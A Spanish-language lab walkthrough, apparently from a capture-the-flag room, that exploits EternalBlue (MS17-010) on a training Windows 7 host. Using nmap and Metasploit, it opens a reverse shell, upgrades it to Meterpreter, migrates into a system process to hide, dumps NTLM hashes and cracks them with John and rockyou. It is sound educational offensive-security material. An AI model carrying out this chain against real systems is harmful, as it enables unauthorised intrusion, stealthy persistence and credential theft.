---
tags:
  - Metasploit
  - Meterpreter
  - Eternal_blue
---
Vamos a comenzar esta maquina, realizando un escaneo de puertos con la herramienta `nmap` a la IP que se me ha otorgado `10.10.73.62`.
```sh mar=1 imp=9,17
root@ip-10-10-126-207:~# nmap -sS -sV 10.10.73.62
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-09 10:35 BST
Nmap scan report for 10.10.73.62
Host is up (0.00051s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 02:F2:85:7C:09:6D (Unknown)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.12 seconds
```

En esta salida con los parámetros "**-sS**" (Ocultamiento de huella) y "**-sV**" (Nos permite ver las versiones e información relevante) podemos ver que tenemos un servicio samba abierto en el puerto 445, ahora vamos a revisar si es vulnerable a la vulnerabilidad `ms17-010` o mejor denominada "**Eternal blue**", esto nuevamente lo vamos a realizar con `nmap`.

```sh mar=1 imp=14
root@ip-10-10-126-207:~# nmap -p 445 --script smb-vuln-ms17-010 10.10.73.62
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-09 10:41 BST
Nmap scan report for 10.10.73.62
Host is up (0.00017s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:F2:85:7C:09:6D (Unknown)

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
```

Con este comando hemos realizado un escaneo al servidor con una vulnerabilidad dirigida (`ms17-010`) con el parámetro "**--script smb-vuln-ms17-010**" y en la salida vemos como tiene activa esta vulnerabilidad, por lo que ahora ya podemos determinar dos cosas, primero que es un "windows 7" y tiene la versión de "Sambav1".

Ahora que ya sabemos que es vulnerable a eternal blue, vamos a iniciar `Metasploit` con el modulo "**exploit/windows/smb/ms17_010_eternalblue**" y le ponemos el único dato que tenemos.

```sh mar=1,4,6 imp=7
root@ip-10-10-126-207:~# msfconsole -q
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.73.62
RHOSTS => 10.10.73.62
```

Ahora para un mejor manejo de la situación vamos a asegurarnos de tener un buen payload

```sh mar=1 imp=2
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
```

Y ahora si vamos a desplegar el ataque que hemos configurado

```sh imp=28-30,38
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.10.126.207:4444 
[*] 10.10.73.62:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.73.62:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.73.62:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.73.62:445 - The target is vulnerable.
[*] 10.10.73.62:445 - Connecting to target for exploitation.
[+] 10.10.73.62:445 - Connection established for exploitation.
[+] 10.10.73.62:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.73.62:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.73.62:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.73.62:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.73.62:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.73.62:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.73.62:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.73.62:445 - Sending all but last fragment of exploit packet
[*] 10.10.73.62:445 - Starting non-paged pool grooming
[+] 10.10.73.62:445 - Sending SMBv2 buffers
[+] 10.10.73.62:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.73.62:445 - Sending final SMBv2 buffers.
[*] 10.10.73.62:445 - Sending last fragment of exploit packet!
[*] 10.10.73.62:445 - Receiving response from exploit packet
[+] 10.10.73.62:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.73.62:445 - Sending egg to corrupted connection.
[*] 10.10.73.62:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.73.62
[*] Command shell session 1 opened (10.10.126.207:4444 -> 10.10.73.62:49243) at 2025-06-09 11:08:01 +0100
[+] 10.10.73.62:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.73.62:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.73.62:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>
```

Y ganamos acceso a la máquina :], ahora la pondremos de fondo y usaremos un modulo que nos piden.

```sh mar=1,2,16 imp=26,23 
msf6 post(multi/manage/shell_to_meterpreter) > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION  1                yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type               Information                                               Connection
  --  ----  ----               -----------                                               ----------
  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.10.126.207:4444 -> 10.10.73.62:49243 (10.10.73.62)

msf6 post(multi/manage/shell_to_meterpreter) > set session 1
session => 1
```

Y ejecutamos el exploit

```sh mar=1 imp=5
msf6 post(multi/manage/shell_to_meterpreter) > run
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.126.207:4433 
[*] Post module execution completed
```

Ahora vamos a revisar que tengamos todos los privilegios (NT AUTHORITY\SYSTEM)

```sh mar=10,24 imp=19,25
msf6 post(multi/manage/shell_to_meterpreter) > run
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.7.100:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (203846 bytes) to 10.10.7.248
[*] Meterpreter session 2 opened (10.10.7.100:4433 -> 10.10.7.248:49196) at 2025-06-09 12:42:54 +0100
[*] Stopping exploit/multi/handler
sessions

Active sessions
===============

  Id  Name  Type                     Information                                             Connection
  --  ----  ----                     -----------                                             ----------
  1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601] ---  10.10.7.100:4444 -> 10.10.7.248:49188 (10.10.7.248)
                                     --
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                            10.10.7.100:4433 -> 10.10.7.248:49196 (10.10.7.248)

msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Ahora para "camuflarnos" entre los servicios, vamos a migrar nuestro servicio

```sh imp=17-18 mar=16,1
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 356   692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
[...]
 2004  816   WmiPrvSE.exe
 2156  692   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
 2216  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
[...]
meterpreter > migrate 2156
[*] Migrating from 2576 to 2156...
[*] Migration completed successfully.
```

Y ahora si ya estamos camuflados 

```sh
2156  692   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
```

Ahora si podremos actuar de forma segura, lo primero que vamos a hacer es tener persistencia en el sistema crackeando contraseñas, para ello lo primero que vamos a hacer es hacer un `hashdump` y ver que usuarios pueden ser interesantes crakear la contraseña.

```sh
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Y vamos a crakear las 2 contraseñas más interesantes mediante un ataque de diccionario con rockyou.

```sh mar=1,10,11 con=6,16
root@ip-10-10-7-100:~# john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (?)
1g 0:00:00:06 DONE (2025-06-09 12:54) 0.1517g/s 1547Kp/s 1547Kc/s 1547KC/s alr1979..alpus
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 
root@ip-10-10-7-100:~# nano hash2.txt
root@ip-10-10-7-100:~# john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hash2.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (?)
1g 0:00:00:00 DONE (2025-06-09 12:57) 50.00g/s 240000p/s 240000c/s 240000C/s terminator..2222222
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed.
```

